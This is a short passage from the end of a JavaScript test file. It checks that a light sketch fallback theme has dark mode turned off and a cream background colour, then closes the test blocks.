    expect(lightSketchFallback.themeVariables?.darkMode).toBe(false);
    expect(lightSketchFallback.themeVariables?.background).toBe("#faf8f2");
  });
});
